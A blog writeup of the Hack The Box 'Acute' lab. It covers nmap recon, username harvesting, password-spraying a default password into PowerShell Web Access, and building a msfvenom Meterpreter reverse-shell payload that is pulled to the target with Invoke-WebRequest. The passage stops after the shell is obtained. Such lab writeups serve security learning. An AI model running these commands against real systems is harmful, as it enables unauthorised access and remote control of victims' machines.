---
layout: default
title : muzec - Acute HTB Writeup
---

![image](https://user-images.githubusercontent.com/69868171/156177972-e49f95d9-c2ca-41e9-8b24-01f8194d90a5.png)

Now that is a tough machine man it pain full of pain but interesting at last witjout easting to much of time let jump in already.

We always start with an nmap scan.....

```
nmap -p- --min-rate 10000 -oA nmap/allports -v IP
```

```
# Nmap 7.91 scan initiated Wed Feb 16 14:29:52 2022 as: nmap -p- --min-rate 10000 -oN nmap/full.tcp -v 10.10.11.145
Nmap scan report for 10.10.11.145
Host is up (0.27s latency).
Not shown: 65534 filtered ports
PORT    STATE SERVICE
443/tcp open  https

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Feb 16 14:31:33 2022 -- 1 IP address (1 host up) scanned in 101.32 seconds
```

Now that is strange just one port which is 443 `HTTPS` .

```
nmap -sC -sV -oN nmap/normal.tcp -p 443 10.10.11.145
```

```
# Nmap 7.91 scan initiated Wed Feb 16 14:29:26 2022 as: nmap -sC -sV -oN nmap/normal.tcp -p 443 10.10.11.145
Nmap scan report for 10.10.11.145
Host is up (0.29s latency).

PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=atsserver.acute.local
| Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver
| Not valid before: 2022-01-06T06:34:58
|_Not valid after:  2030-01-04T06:34:58
|_ssl-date: 2022-02-16T16:29:37+00:00; +2h59m36s from scanner time.
| tls-alpn: 
|_  http/1.1
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2h59m35s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 16 14:30:03 2022 -- 1 IP address (1 host up) scanned in 36.87 seconds
```

Now that is interesting let add `atsserver.acute.local 10.10.14.145` to `/etc/hosts` now let see what we have running on the webpage.

![image](https://user-images.githubusercontent.com/69868171/156181902-9045b656-d4c7-41d0-8248-88ff646468cc.png)

Now what do we have let try looking around to see what we can get maybe hint or anything that can be useful to further our enumeration forawrd.

![image](https://user-images.githubusercontent.com/69868171/156183053-2b5b1f08-1e2d-476e-bf46-a38294bda1f4.png)

Now we can use that to create some userlist maybe it can useful.

```
Awallace
Chall
Edavies
Imonks
Jmorgan
Lhopkins
```

![image](https://user-images.githubusercontent.com/69868171/156183552-50ae0f9f-64d1-4428-bccc-02e961ea6bb2.png)

Now that `New Starter Forms` look interesting let click on it.

![image](https://user-images.githubusercontent.com/69868171/156183902-524269ba-7f1b-486b-9e45-9b79ce61b9f6.png)

So we downloaded a doc file let check it and see what we have in it.

![image](https://user-images.githubusercontent.com/69868171/156184767-9fde86cc-19d1-4407-98f1-100abfd9d67e.png)

Seems like a checklist interesting right now that is promising.

![image](https://user-images.githubusercontent.com/69868171/156185182-ad8445e1-421f-419e-ba1d-a181f1914ce3.png)

Arrange for the new starter to meet with other staff in the department as appropriate. This could include the Head of Department and/or other members of the appointee’s team. Complete the remote training.

![image](https://user-images.githubusercontent.com/69868171/156185441-73c9cd98-891e-4c52-a06f-82f7fbd286cc.png)

Now that is cool i click on the `remote` which i got transfer to a `staff` webpage which is a `Windows PowerShell Web Access` ahhh nice.

![image](https://user-images.githubusercontent.com/69868171/156186194-376d4baa-fcf9-4283-8f2d-94bb712e48b5.png)

Since we already know the default password for new staff which is `Password1!` let try to get the computer name back to the doc let check if we have anything hidden on it with `exiftool`.

![image](https://user-images.githubusercontent.com/69868171/156186974-0ea602cc-7360-4596-9162-3b641c2d2b2b.png)

Now we have the `Computer name` let the password with all the userlist we compile.

![image](https://user-images.githubusercontent.com/69868171/156187227-dab95b77-b067-4d15-b64c-cb80fda91428.png)

I was able to get in with `edavies` now time to enumerate the system more to see what we can loot. So the best thing o do now is to get a proper reverse shell back to our terminal.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.145]
└─$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.52 LPORT=1337 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 200262 bytes
Final size of exe file: 206848 bytes

```

Now we use `msfvenom` to generate a payload file to get a reverse shell now let find writable folder on the target.

![image](https://user-images.githubusercontent.com/69868171/156188121-d4161881-652f-477d-ba97-87f2b7a13fe8.png)

Found a writable folder let transfer our payload.

![image](https://user-images.githubusercontent.com/69868171/156188597-01afc027-6f21-4b56-92a3-51d0819c2554.png)

```
Invoke-WebRequest "http://10.10.14.52:8000/shell.exe" -OutFile "shell.exe"
```

Now let start our listener before executing our payload.

![image](https://user-images.githubusercontent.com/69868171/156191500-749a7199-5cae-4d1a-adc8-1bf1e44a45e1.png)

Now let click on run and execute the payload on the target.

![image](https://user-images.githubusercontent.com/69868171/156191791-cf235a00-0a30-4930-976b-da43b6698f8c.png)

Now that we a meterpreter shell let use the `screenshare` command to see what has taken place on the target 
